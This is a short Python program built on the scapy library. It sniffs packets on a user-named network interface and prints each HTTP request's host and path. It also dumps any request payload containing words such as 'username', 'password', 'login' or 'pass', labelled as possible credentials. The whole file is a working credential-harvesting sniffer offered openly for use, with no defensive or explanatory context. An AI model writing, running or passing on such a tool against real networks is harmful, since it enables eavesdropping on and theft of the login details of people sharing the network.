from scapy.all import *
from scapy.layers import http
import argparse


class PacketSniffer:

    def __init__(self):
        pass

    def get_arguments(self):
        parser = argparse.ArgumentParser()
        parser.add_argument("-i", "--interface", dest="Iface", help="Enter the interface")
        options = parser.parse_args()
        if not options.Iface:
            print("[+] No interface specifies. Exiting")
            exit()
        return options

    def sniff(self, interface):
        sniff(iface=interface, store=False, prn=self.display)

    def get_url(self, packet):
        return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

    def get_login_info(self, packet):
        if packet.haslayer(Raw):
            keywords = ["username", "login", "password", "user", "pass"]
            load = str(packet[Raw].load)
            for keyword in keywords:
                if keyword in load:
                    return load

    def display(self, packet):
        if packet.haslayer(http.HTTPRequest):
            url = self.get_url(packet).decode()
            print("[+] HTTP request ->"+url)
            cred = self.get_login_info(packet)
            if cred:
                print("[+] Possible Username/Password ->" + cred)


obj = PacketSniffer()
options = obj.get_arguments()
interface = options.Iface
obj.sniff(interface)
